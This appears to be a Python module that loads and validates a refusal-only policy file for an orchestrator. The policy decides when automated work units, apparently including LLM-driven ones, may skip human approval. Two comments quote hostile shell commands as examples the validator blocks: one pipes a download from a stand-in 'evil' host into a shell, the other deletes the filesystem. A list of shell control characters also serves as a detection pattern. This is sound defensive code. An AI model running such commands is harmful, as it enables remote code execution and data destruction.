"""The policy artifact: one versioned document, keyed on reach (WS-P2.18 Increment 2, ADR-0010).

WS-P2.18 replaces four scattered policies -- the authority known-good pattern, the change window,
the per-key lease, and self-update -- with a single versioned document keyed on what a package's
work touches when it runs (``reach``, ADR-0009). This module is that document's loader. The
document itself is ``factory-policy.toml``, next to this file.

**Its only expressible output is a refusal.** There is no permission in this schema and no boolean
in this module: :meth:`FactoryPolicy.refusals_for` returns the reasons policy objects, and an empty
tuple means "this policy raises no objection", which is a strictly weaker claim than "go ahead".
Permission is the conjunction of every admission check, of which policy is one term and the hard
off-switch is another. Policy can only ever lengthen the list of objections, so it cannot widen
what that switch allows -- not by convention or by check ordering, but because a widening is
unwritable. This module deliberately imports nothing from ``orchestrator.config``: it cannot read
the off-switch, so it cannot overrule it.

**Nothing is cached.** The artifact is read and parsed on every call. A cache is the mechanism by
which a policy change silently fails to take effect, and this surface has no volume that would
justify one -- so noticing an edit costs no restart. Getting new bytes onto a running process is a
separate question, answered by how the image ships (see ADR-0010).

**Unknown resolves restrictively, in all four directions.** An undeclared reach, a member outside
the vocabulary, and a member with no row each produce a refusal rather than an absence of one; and
a malformed document or an unrecognised schema version raises a named error rather than yielding an
empty policy, because an empty policy is the permissive reading of a broken file.

**Total coverage, no implicit default.** Every member of ``REACH_VOCABULARY`` must have exactly one
row, and a row for a member the vocabulary does not know is an error. That makes the artifact a
pinned projection of the vocabulary rather than a second copy of it: a new member added without a
row does not fall through to something lenient, it stops the document loading.

**Schema version 2 adds known-good patterns (ADR-0011), and they are still refusals.** A pattern is
a declared, dated, reasoned description of an envelope shape. It grants nothing: what it does is
withhold the ``authority_envelope_novel`` objection from an envelope it recognises. Every other
envelope draws that objection, so the human-authority requirement is the DEFAULT and recognition is
the exception -- which is why a pattern that fails to load, a reach nobody declared, and a field no
pattern accounts for all resolve the same way, to asking.
"""

from __future__ import annotations

import shlex
import tomllib
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from datetime import date
from pathlib import Path
from typing import Any, Final
from uuid import UUID

from orchestrator.errors import DomainError
from orchestrator.kernel.authority import AuthorityEnvelope
from orchestrator.reach_vocabulary import REACH_VOCABULARY

PACKAGED_ARTIFACT: Final[Path] = Path(__file__).parent / "factory-policy.toml"

# The schema versions this loader understands. A version outside this set is a named failure, never
# a best-effort read: an older process meeting a newer document would silently ignore whatever
# narrowing the new version introduced, which is the permissive reading of a version skew. A new
# version is therefore a coordinated change -- the loader learns it in the same commit that ships
# the document at it and the code that reads its new field.
SUPPORTED_SCHEMA_VERSIONS: Final[frozenset[int]] = frozenset({2})

# Why policy objects. These are the whole output vocabulary of this module.
REACH_UNDECLARED: Final = "reach_undeclared"
REACH_UNRECOGNISED: Final = "reach_unrecognised"
REACH_NOT_IN_POLICY: Final = "reach_not_in_policy"
AUTHORITY_ENVELOPE_NOVEL: Final = "authority_envelope_novel"

_ROW_REQUIRED_FIELDS = frozenset({"rationale", "decided"})
_ROW_OPTIONAL_FIELDS = frozenset({"known_good"})
_TOP_LEVEL_FIELDS = frozenset({"version", "reach"})
_PATTERN_FIELDS = frozenset(
    {
        "name",
        "rationale",
        "decided",
        "change_class",
        "capabilities",
        "max_attempts",
        "max_llm_calls",
        "conformance_status",
        "target_repositories",
        "command_prefixes",
    }
)

# The one envelope shape schema 2 can describe: a unit that runs an ordered command list against
# one repository. Every stored envelope of that shape carries exactly these constraint keys --
# three from the authoring side and `work_unit_id`, which the orchestrator stamps. The set is
# EXACT, so a constraint nobody declared is an envelope no pattern recognises. A different shape
# (a unit that runs no commands, say) is a different schema version, not a looser check here.
_CONSTRAINT_FIELDS = frozenset(
    {"allowed_commands", "mutation_commands", "target_repository", "work_unit_id"}
)
_CONFORMANCE_FIELDS = frozenset({"status", "standards_touched", "accepted_standards"})

# Characters through which a command string could become more than the one invocation its declared
# prefix describes: chaining, substitution, redirection, expansion, globbing. A command carrying
# any of them OUTSIDE quotes is not recognised, whatever prefix it starts with -- otherwise
# `uv add x; curl evil | sh` would match the prefix `uv add`. Held as a string rather than a set
# because it is a character class: there is no other side that enumerates these, so there is
# nothing for it to agree with.
_SHELL_CONTROL_CHARACTERS: Final = ";&|<>()$`\\\n\r\t*?!{}#~"


def _invalid(detail: str) -> DomainError:
    return DomainError(
        "factory_policy_invalid",
        f"the policy artifact is invalid: {detail}",
        "correct factory-policy.toml; a document that does not load permits nothing",
    )


@dataclass(frozen=True)
class KnownGoodPattern:
    """An envelope shape somebody decided, on a date, for a stated reason (ADR-0011).

    Declared, never learned. Every field NARROWS: an envelope is recognised only when the pattern
    accounts for all of it, so a pattern that omits a field describes fewer envelopes rather than
    more. There is no field here whose absence widens anything, and none that permits.
    """

    name: str
    rationale: str
    decided: date
    change_class: str
    capabilities: Mapping[str, str]
    max_attempts: int
    max_llm_calls: int
    conformance_status: str
    target_repositories: frozenset[str]
    command_prefixes: tuple[tuple[str, ...], ...]


@dataclass(frozen=True)
class ReachPolicy:
    """One row -- everything policy currently says about a single reach member."""

    member: str
    rationale: str
    decided: date
    known_good: tuple[KnownGoodPattern, ...] = ()


@dataclass(frozen=True)
class AuthorityRecognition:
    """Why policy objects to work running without a human authority approval.

    ``refusals`` empty means policy raises no objection -- weaker than "go ahead", as everywhere
    else here: the human requirement is one term in an admission conjunction, and lifting it lifts
    nothing else. ``recognised_by`` names the patterns that withheld the objection, and is what a
    suppression record cites; it is empty whenever any refusal stands.
    """

    refusals: tuple[str, ...]
    recognised_by: tuple[str, ...]


@dataclass(frozen=True)
class FactoryPolicy:
    """A loaded artifact. Answers only in refusals."""

    version: int
    source: str
    rows: Mapping[str, ReachPolicy]

    def refusals_for(self, reach: Sequence[str] | None) -> tuple[str, ...]:
        """Why this policy objects to work of the given reach; empty means it does not object.

        Composition over a reach set is the union of its members' refusals, which is the same
        thing as intersection-of-permission (ADR-0009): adding a member can only lengthen the
        result, never shorten it.
        """
        if not reach:
            return (REACH_UNDECLARED,)
        refusals: set[str] = set()
        for member in reach:
            if member not in REACH_VOCABULARY:
                refusals.add(REACH_UNRECOGNISED)
            elif member not in self.rows:
                refusals.add(REACH_NOT_IN_POLICY)
        return tuple(sorted(refusals))

    def authority_refusals(
        self,
        reach: Sequence[str] | None,
        envelope: AuthorityEnvelope,
        unit_id: UUID,
    ) -> AuthorityRecognition:
        """Why policy objects to this envelope running without a human authority approval.

        A pattern is declared UNDER a reach row, so a work unit that reaches two places must be
        recognised under both -- the same union-of-refusals composition ``refusals_for`` uses, and
        the same reason: a member can only add objections. Reach nobody declared, or a member this
        build does not know, is answered by ``refusals_for`` before any pattern is consulted, so an
        unclassifiable reach never reaches the matcher at all.
        """
        refusals = set(self.refusals_for(reach))
        if refusals or reach is None:
            return AuthorityRecognition(tuple(sorted(refusals)), ())
        names: set[str] = set()
        for member in reach:
            name = _recognising_pattern(self.rows[member], envelope, unit_id)
            if name is None:
                refusals.add(AUTHORITY_ENVELOPE_NOVEL)
            else:
                names.add(name)
        if refusals:
            return AuthorityRecognition(tuple(sorted(refusals)), ())
        return AuthorityRecognition((), tuple(sorted(names)))

    def report(self) -> dict[str, Any]:
        """What this process is enforcing, for an operator reading the running instance."""
        return {
            "version": self.version,
            "source": self.source,
            "reach": [
                {
                    "member": row.member,
                    "rationale": row.rationale,
                    "decided": row.decided,
                    "known_good": [_pattern_report(pattern) for pattern in row.known_good],
                }
                for row in self.rows.values()
            ],
        }


def _pattern_report(pattern: KnownGoodPattern) -> dict[str, Any]:
    return {
        "name": pattern.name,
        "rationale": pattern.rationale,
        "decided": pattern.decided,
        "change_class": pattern.change_class,
        "capabilities": dict(sorted(pattern.capabilities.items())),
        "max_attempts": pattern.max_attempts,
        "max_llm_calls": pattern.max_llm_calls,
        "conformance_status": pattern.conformance_status,
        "target_repositories": sorted(pattern.target_repositories),
        "command_prefixes": [" ".join(prefix) for prefix in pattern.command_prefixes],
    }


def _recognising_pattern(
    row: ReachPolicy, envelope: AuthorityEnvelope, unit_id: UUID
) -> str | None:
    """The name of the first pattern in this row that recognises the envelope, or ``None``."""
    for pattern in row.known_good:
        if _recognises(pattern, envelope, unit_id):
            return pattern.name
    return None


def _recognises(pattern: KnownGoodPattern, envelope: AuthorityEnvelope, unit_id: UUID) -> bool:
    """Whether the pattern accounts for EVERY field of the envelope.

    Totality is the whole guarantee. ``normalized()`` has six fields and each is checked here, so
    an envelope carrying anything the pattern did not describe falls through to the human. That
    includes ``unknown_fields``, which is how a field this build has never heard of is refused
    rather than ignored -- the fingerprint records such a field by NAME only, so its value was
    never attested by anyone.
    """
    return (
        not envelope.unknown_fields
        and envelope.change_class == pattern.change_class
        and envelope.capabilities.items() <= pattern.capabilities.items()
        and _within(envelope.budgets.max_attempts, pattern.max_attempts)
        and _within(envelope.budgets.max_llm_calls, pattern.max_llm_calls)
        and _conformance_recognised(envelope.conformance, pattern.conformance_status)
        and _constraints_recognised(pattern, envelope.constraints, unit_id)
    )


def _within(value: int | None, ceiling: int) -> bool:
    """A declared budget at or below the pattern's ceiling. ``None`` is unbounded, so it is not."""
    return value is not None and value <= ceiling


def _conformance_recognised(conformance: Mapping[str, Any] | None, status: str) -> bool:
    """The claim must be complete, green by the pattern's own word, and waive nothing.

    A non-empty ``accepted_standards`` is a waiver -- the branch in admission that lets a claim
    through on standards somebody agreed to accept rather than on standards being met. Whatever
    else that is, it is not routine, so it is exactly the case a human still looks at.
    """
    if conformance is None or set(conformance) != _CONFORMANCE_FIELDS:
        return False
    touched = conformance["standards_touched"]
    return (
        conformance["status"] == status
        and conformance["accepted_standards"] == []
        and isinstance(touched, list)
        and all(isinstance(standard, str) for standard in touched)
    )


def _constraints_recognised(
    pattern: KnownGoodPattern, constraints: Mapping[str, Any], unit_id: UUID
) -> bool:
    if set(constraints) != _CONSTRAINT_FIELDS:
        return False
    # The stamped id is fingerprinted by value, so leaving it unaccounted for would be a hole in
    # the totality claim above. It can only ever be this unit's own id.
    if constraints["work_unit_id"] != str(unit_id):
        return False
    if constraints["target_repository"] not in pattern.target_repositories:
        return False
    return all(
        _commands_recognised(constraints[field], pattern.command_prefixes)
        for field in ("allowed_commands", "mutation_commands")
    )


def _commands_recognised(value: object, prefixes: tuple[tuple[str, ...], ...]) -> bool:
    if not isinstance(value, list) or not value:
        return False
    return all(isinstance(command, str) and _command(command, prefixes) for command in value)


def _command(command: str, prefixes: tuple[tuple[str, ...], ...]) -> bool:
    """Whether one command is inert and begins with a declared prefix.

    Both halves are load-bearing and neither is sufficient. A prefix alone bounds only the first
    tokens, and ``uv add x && rm -rf /`` begins with ``uv add``. Inertness alone bounds only the
    grammar, and an inert command can still be any program on the machine.
    """
    if not _inert(command):
        return False
    try:
        tokens = shlex.split(command)
    except ValueError:
        return False
    return any(tuple(tokens[: len(prefix)]) == prefix for prefix in prefixes)


def _inert(command: str) -> bool:
    """No shell control character outside quotes, and no quote left open.

    Quote tracking is what makes this usable rather than merely strict: the real commands carry
    version specifiers like ``'ruff>=0.15.21'``, whose ``>`` is a redirection everywhere except
    inside the quotes it is actually written in. Scanned character by character rather than lexed,
    because a lexer resolves quoting and hands back tokens in which an unquoted ``>`` and a quoted
    one are indistinguishable -- which is the direction that fails open.
    """
    quote = ""
    for character in command:
        if quote:
            quote = "" if character == quote else quote
        elif character in "'\"":
            quote = character
        elif character in _SHELL_CONTROL_CHARACTERS:
            return False
    return not quote


def load_factory_policy(path: Path = PACKAGED_ARTIFACT) -> FactoryPolicy:
    """The artifact at ``path``, validated. Raises rather than returning a degraded policy."""
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as error:
        raise _invalid(f"{path.name} could not be read") from error
    try:
        document = tomllib.loads(text)
    except tomllib.TOMLDecodeError as error:
        raise _invalid(f"{path.name} is not valid TOML: {error}") from error
    return FactoryPolicy(
        version=_schema_version(document),
        source=path.name,
        rows=_rows(document),
    )


def _schema_version(document: Mapping[str, Any]) -> int:
    unknown = set(document) - _TOP_LEVEL_FIELDS
    if unknown:
        raise _invalid("it declares unknown top-level keys: " + ", ".join(sorted(unknown)))
    version = document.get("version")
    # `bool` is an `int` in Python, and `version = true` is a shape error rather than version 1.
    if not isinstance(version, int) or isinstance(version, bool):
        raise _invalid("`version` must be present and an integer")
    if version not in SUPPORTED_SCHEMA_VERSIONS:
        raise DomainError(
            "factory_policy_version_unsupported",
            f"the policy artifact declares schema version {version}, which this build does "
            "not understand",
            "ship a build that knows this schema version, or restore the artifact to one it does",
        )
    return version


def _rows(document: Mapping[str, Any]) -> Mapping[str, ReachPolicy]:
    table = document.get("reach")
    if not isinstance(table, dict):
        raise _invalid("it must declare a `[reach]` table")
    missing = sorted(set(REACH_VOCABULARY) - set(table))
    extra = sorted(set(table) - set(REACH_VOCABULARY))
    if missing or extra:
        raise _invalid(
            "every reach member needs exactly one row and no others are allowed"
            + (f"; missing: {', '.join(missing)}" if missing else "")
            + (f"; unknown: {', '.join(extra)}" if extra else "")
        )
    return {member: _row(member, table[member]) for member in sorted(table)}


def _row(member: str, value: object) -> ReachPolicy:
    if not isinstance(value, dict):
        raise _invalid(f"`[reach.{member}]` must be a table")
    declared = set(value)
    if (
        not _ROW_REQUIRED_FIELDS <= declared
        or declared - _ROW_REQUIRED_FIELDS - _ROW_OPTIONAL_FIELDS
    ):
        raise _invalid(
            f"`[reach.{member}]` must declare "
            + ", ".join(sorted(_ROW_REQUIRED_FIELDS))
            + " and at most "
            + ", ".join(sorted(_ROW_OPTIONAL_FIELDS))
            + f"; it declares {', '.join(sorted(declared)) or 'nothing'}"
        )
    rationale = value["rationale"]
    if not isinstance(rationale, str) or not rationale.strip():
        raise _invalid(f"`[reach.{member}].rationale` must be a non-empty string")
    return ReachPolicy(
        member=member,
        # Wrapped in the file for review; one sentence on the wire.
        rationale=" ".join(rationale.split()),
        decided=_decided(f"reach.{member}", value["decided"]),
        known_good=_patterns(member, value.get("known_good", [])),
    )


def _patterns(member: str, value: object) -> tuple[KnownGoodPattern, ...]:
    if not isinstance(value, list):
        raise _invalid(f"`[[reach.{member}.known_good]]` must be an array of tables")
    patterns = tuple(_pattern(member, entry) for entry in value)
    names = [pattern.name for pattern in patterns]
    if len(set(names)) != len(names):
        raise _invalid(f"`[reach.{member}]` declares two known-good patterns with the same name")
    return patterns


def _pattern(member: str, value: object) -> KnownGoodPattern:
    where = f"reach.{member}.known_good"
    if not isinstance(value, dict) or set(value) != _PATTERN_FIELDS:
        raise _invalid(
            f"`[[{where}]]` must be a table declaring exactly " + ", ".join(sorted(_PATTERN_FIELDS))
        )
    name = _text(where, "name", value["name"])
    return KnownGoodPattern(
        name=name,
        rationale=_text(f"{where}.{name}", "rationale", value["rationale"]),
        decided=_decided(f"{where}.{name}", value["decided"]),
        change_class=_text(f"{where}.{name}", "change_class", value["change_class"]),
        capabilities=_capabilities(f"{where}.{name}", value["capabilities"]),
        max_attempts=_ceiling(f"{where}.{name}", "max_attempts", value["max_attempts"]),
        max_llm_calls=_ceiling(f"{where}.{name}", "max_llm_calls", value["max_llm_calls"]),
        conformance_status=_text(
            f"{where}.{name}", "conformance_status", value["conformance_status"]
        ),
        target_repositories=frozenset(
            _string_list(f"{where}.{name}", "target_repositories", value["target_repositories"])
        ),
        command_prefixes=_command_prefixes(f"{where}.{name}", value["command_prefixes"]),
    )


def _text(where: str, field: str, value: object) -> str:
    if not isinstance(value, str) or not value.strip():
        raise _invalid(f"`{where}.{field}` must be a non-empty string")
    return " ".join(value.split())


def _ceiling(where: str, field: str, value: object) -> int:
    # A ceiling below zero, or a boolean masquerading as one, is a shape error rather than a
    # narrow pattern: `max_attempts = true` would otherwise read as a ceiling of one.
    if not isinstance(value, int) or isinstance(value, bool) or value < 0:
        raise _invalid(f"`{where}.{field}` must be a non-negative integer")
    return value


def _capabilities(where: str, value: object) -> Mapping[str, str]:
    if not isinstance(value, dict) or not value:
        raise _invalid(f"`{where}.capabilities` must be a non-empty table of capability to level")
    for capability, level in value.items():
        if not isinstance(level, str) or not level.strip():
            raise _invalid(f"`{where}.capabilities.{capability}` must be a non-empty string")
    return dict(value)


def _string_list(where: str, field: str, value: object) -> tuple[str, ...]:
    if not isinstance(value, list) or not value:
        raise _invalid(f"`{where}.{field}` must be a non-empty array of strings")
    for entry in value:
        if not isinstance(entry, str) or not entry.strip():
            raise _invalid(f"`{where}.{field}` entries must be non-empty strings")
    return tuple(value)


def _command_prefixes(where: str, value: object) -> tuple[tuple[str, ...], ...]:
    """Each declared prefix, lexed once at load time into the tokens a command must begin with.

    Written as a command line because that is how the person deciding it thinks about it, and
    compared as tokens because that is the only comparison that means anything: ``uv add`` as a
    string prefix also matches ``uv address-book``.
    """
    prefixes: list[tuple[str, ...]] = []
    for entry in _string_list(where, "command_prefixes", value):
        try:
            tokens = tuple(shlex.split(entry))
        except ValueError as error:
            raise _invalid(
                f"`{where}.command_prefixes` entry is not a command: {entry!r}"
            ) from error
        if not tokens:
            raise _invalid(f"`{where}.command_prefixes` entry is empty: {entry!r}")
        prefixes.append(tokens)
    return tuple(prefixes)


def _decided(where: str, value: object) -> date:
    # A quoted ISO date, following routing-policy.toml. A bare TOML date is a different shape and
    # is rejected rather than accepted alongside -- one shape, so there is nothing to coerce.
    if not isinstance(value, str):
        raise _invalid(f'`{where}.decided` must be a quoted ISO date, e.g. "2026-08-01"')
    try:
        return date.fromisoformat(value)
    except ValueError as error:
        raise _invalid(f"`{where}.decided` is not an ISO date: {value!r}") from error
